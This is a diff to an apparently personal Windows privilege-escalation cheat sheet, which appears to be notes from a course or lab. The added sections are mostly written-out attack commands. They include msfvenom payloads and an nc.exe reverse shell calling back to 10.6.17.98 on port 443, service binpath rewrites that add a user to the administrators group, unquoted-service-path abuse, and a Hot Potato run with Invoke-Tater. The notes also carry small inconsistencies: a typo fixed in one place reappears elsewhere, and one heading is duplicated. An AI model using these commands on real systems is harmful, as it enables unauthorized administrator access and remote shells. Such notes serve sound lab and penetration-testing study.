@@ -1554,7 +1554,7 @@ net localgroup administrators
 # Service Escalation - Executable Files
 Powershell -ep bypass
 . .\PowerUp.ps1
-All-AllChecks
+Invoke-AllChecks
 #Check if have any executable permission to file, also check with accesschk64.exe
 accesschk64.exe -wvu “PATH”
 # If you have RW Everyone with FILE_ALL_SYSTEM
@@ -1566,12 +1566,50 @@ sc start "Name of The Service" # You'll get in powerup.ps1, Invoke-AllChecks com
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 # From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
 msfvenom -p windows/shell_reverse_tcp LHOST=10.6.17.98 LPORT=443 -f exe -o program.exe
-#Put file on the path, start the service, restart system or switch the user
-# You will get user
+#Put file on the path, start the service, restart the system or switch the user
+# You will get a user
 
 
 # Escalation Path - DLL Hijacking
-https://www.udemy.com/course/draft/2994784/learn/lecture/19449784#questions/16528788, 
+https://www.udemy.com/course/draft/2994784/learn/lecture/19449784#questions/16528788,
+
+# Escalation Path – Unquoted Service Permissions
+#Look for checking service permissions
+Powershell -ep bypass
+. .\PowerUp.ps1
+All-AllChecks
+#Also check with
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
+#output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.
+C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc Everyone *
+Sc qc daclsvc
+net localgroup administrators
+sc config daclsvc binpath= "net localgroup administrators user /add" # Here computer username will be user
+sc qc daclsvc
+sc start daclsvc
+net localgroup administrators # the uer added into the administrators group.
+
+# Escalation Path – Unquoted Service Permissions
+Powershell -ep bypass
+. .\PowerUp.ps1
+All-AllChecks
+#Look for Unquoted Service Paths, Also check for service name
+msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators user /add" -f exe > Common.exe
+msfvenom -p windows/exec CMD=’C:\Users\user\Desktop\nc.exe 10.6.17.98 443 -e cmd.exe’ -f exe-service -o common.exe
+net localgroup administrators
+sc start unquotedsvc
+net localgroup administrators
+
+# Escalation Path – Hot Potato
+Powershell -ep bypass
+Import-Module .\Tater.ps1
+net localgroup administrators
+Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+#It will take some time to add
+net localgroup administrators
+
+
+
 ```
 
 ## Manual Enumeration commands
